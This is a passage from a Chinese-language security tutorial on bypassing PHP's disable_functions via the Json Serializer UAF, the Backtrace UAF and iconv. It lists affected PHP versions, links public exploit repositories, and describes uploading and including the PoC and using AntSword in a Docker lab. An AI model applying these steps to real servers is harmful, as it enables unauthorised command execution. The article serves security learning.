[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002155-934b1df4-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002155-934b1df4-fc52-1.png)

# 0x0e 利用 Json Serializer UAF

利用条件

- Linux 操作系统
- PHP7.1 - all versions to date
- PHP7.2 < 7.2.19 (released: 30 May 2019)
- PHP7.3 < 7.3.6 (released: 30 May 2019)

[利用漏洞](https://bugs.php.net/bug.php?id=77843)
[POC](https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php)

上传POC到`/var/tmp`目录下

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002200-9659f308-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002200-9659f308-fc52-1.png)

包含bypass文件

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002203-9837bf2a-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002203-9837bf2a-fc52-1.png)

也可以稍作修改

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002206-9a1626a6-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002206-9a1626a6-fc52-1.png)

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002211-9d1d6526-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002211-9d1d6526-fc52-1.png)

当然使用插件是最简单的

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002215-9f52e604-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002215-9f52e604-fc52-1.png)

# 0x0f 利用Backtrace UAF

利用条件

- Linux 操作系统
- PHP7.0 - all versions to date
- PHP7.1 - all versions to date
- PHP7.2 - all versions to date
- PHP7.3 < 7.3.15 (released 20 Feb 2020)
- PHP7.4 < 7.4.3 (released 20 Feb 2020)

[利用漏洞](https://bugs.php.net/bug.php?id=76047)
[EXP](https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)

# 0x10 利用iconv

利用条件

- Linux 操作系统
- `putenv`
- `iconv`
- 存在可写的目录, 需要上传 `.so` 文件

利用原理分析https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/

利用复现:
获得镜像

```
git clone https://github.com/AntSwordProject/AntSword-Labs.git
cd AntSword-Labs/bypass_disable_functions/9
docker-compose up -d
```

无法执行命令

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002221-a2ac6f96-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002221-a2ac6f96-fc52-1.png)

使用iconv插件bypass

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002231-a8fe98ec-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002231-a8fe98ec-fc52-1.png)

创建副本后,将url改为`/.antproxy.php`

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002235-aafd14f2-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002235-aafd14f2-fc52-1.png)

[![img](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002238-ad1e4256-fc52-1.png)](/img/disable/bypass%20disable_functions%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93%20-%20%E5%85%88%E7%9F%A5%E7%A4%BE%E5%8C%BA_files/20210814002238-ad1e4256-fc52-1.png)

# 0x11 参考

[https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Bypass-3](https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#Bypass-3)
[https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/](https://whoamianony.top/2021/03/13/Web安全/Bypass Disable_functions/)
https://clq0.top/bypass-disable_function-php/#iconv
https://github.com/AntSwordProject/AntSword-Labs
https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html
